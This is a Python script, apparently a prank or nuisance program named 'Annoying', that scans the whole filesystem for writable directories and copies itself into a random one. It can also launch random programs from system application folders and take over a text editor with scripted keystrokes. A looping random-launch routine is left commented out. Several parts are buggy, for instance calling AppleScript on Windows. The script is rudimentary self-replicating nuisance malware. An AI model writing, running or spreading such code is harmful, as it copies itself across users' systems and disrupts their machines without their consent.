import random
import os
import time
import platform
import subprocess
import osascript
import sys
import shutil

class Annoying:
    def __init__(self):
        #get the name of the current system
        self.os_name = platform.system()
        #get the script name
        self.script_name = os.path.basename(__file__)
        self.writable_directories = self.find_writable_directories()

    def find_writable_directories(self):
        writable_directories = []
        # Recursively traverse the file system and find all directories
        for root, dirs, files in os.walk('/'):
            for directory in dirs:
                # Check if the script has permission to write to the directory
                if os.access(directory, os.W_OK):
                    # Add the directory to the list of writable directories
                    writable_directories.append(directory)         

        return writable_directories

    def replicate_script(self):
        
        # Generate a random number
        rand_int = random.randint(0, len(self.writable_directories) - 1)

        # Select a random directory from the list
        rand_dir = self.writable_directories[rand_int]

        # Combine the path of the selected directory with the script name
        script_random_path = os.path.join(rand_dir)
        
        # Specify the correct path to the script file
        script_path = os.path.realpath(__file__)

        # Use os.path.dirname() to get the directory component of the file path
        script_directory = os.path.dirname(script_path)
        script_file = os.path.join(script_directory, self.script_name)
        
        print(f"The random script path is: {script_random_path}")
        print(f"The script path is: {script_file}")
        #opens the folder
        subprocess.run(['open', script_random_path])

        if os.path.exists(script_file):
            # Check if the destination directory exists
            if os.path.exists(script_path):
                # Use shutil.copy() to replicate the script in the selected directory
                shutil.copy(script_file, script_random_path)
            else:
                print("Error: Destination directory does not exist.")
        else:
            print("Error: Script file does not exist.")
            

    # This function opens a the text editor and starts typing
    def open_text_editor_and_start_typing(self):
        if self.os_name == "Darwin":
            # Get the base path of the "Applications" directory
            base_path = os.path.join("/", "Applications")

            # Get the path to the "TextEdit.app" program
            program = os.path.join(base_path, "TextEdit.app")
            
            # Open the "TextEdit.app" program and create a new document
            subprocess.run(["open", "-a", program])

            # Use the "osascript" command to create a new document in TextEdit.app
            subprocess.run(["osascript", "-e", 'tell application "TextEdit" to activate'])
            subprocess.run(["osascript", "-e", 'tell application "System Events" to keystroke "n" using {command down}'])

            # Type the text "Hello, world!" in the new document
            
            subprocess.run(["osascript", "-e", 'tell application "TextEdit" to set the clipboard to "Hello, world!"'])
            subprocess.run(["osascript", "-e", 'tell application "System Events" to keystroke "v" using command down'])
        elif self.os_name == "Linux":
            # Open the default text editor program
            subprocess.run(["xdg-open", "gedit"])

            # Type the text "Hello, world!" in the new document
            subprocess.run(["xdotool", "type", "Hello, world!"])
        elif self.os_name == "Windows":
            # Open the default text editor program
            subprocess.run(["start", "notepad.exe"])

            # Type the text "Hello, world!" in the new document
            subprocess.run(["osascript", "-e", 'tell application "Notepad" to activate'])
            subprocess.run(["osascript", "-e", 'tell application "Notepad" to set the clipboard to "Hello, world!"'])
            subprocess.run(["osascript", "-e", 'tell application "System Events" to keystroke "v" using command down'])

    def open_random_program(self):
        # Check the operating system and open a program accordingly
        if self.os_name == "Windows":
            # Get the base path of the "Program Files" directory
            base_path = os.path.join("C:", os.sep, "Program Files")

            # Get a list of all the programs in the "Program Files" directory
            programs = [
                os.path.join(base_path, f)
                for f in os.listdir(base_path)
                if f.endswith(".exe")
            ]

            # Select a random program from the list
            program = random.choice(programs)
            
            # Open the program using the subprocess module
            subprocess.run([program])
        elif self.os_name == "Darwin":
            # Get the base path of the "Applications" directory
            base_path = os.path.join("/", "Applications")

            # Get a list of all the programs in the "Applications" directory
            programs = [
                os.path.join(base_path, f)
                for f in os.listdir(base_path)
                if f.endswith(".app")
            ]

            # Select a random program from the list
            program = random.choice(programs)
            # Open the program using the subprocess module
            subprocess.run(["open", program])

        elif self.os_name == "Linux":
            # Get the base path of the "bin" directory
            base_path = os.path.join("/", "bin")

            # Get a list of all the programs in the "bin" directory
            programs = [
                os.path.join(base_path, f)
                for f in os.listdir(base_path)
            ]

            # Select a random program from the list
            program = random.choice(programs)
            # Open the program using the subprocess module
            subprocess.run([program])

# Main function
if __name__ == "__main__":
    annoy = Annoying()
    #annoy.open_text_editor_and_start_typing()
    annoy.replicate_script()
    #while True:
        #Open the random program at a random time
        #time.sleep(random.randint(1, 10))
        #annoy.open_random_program()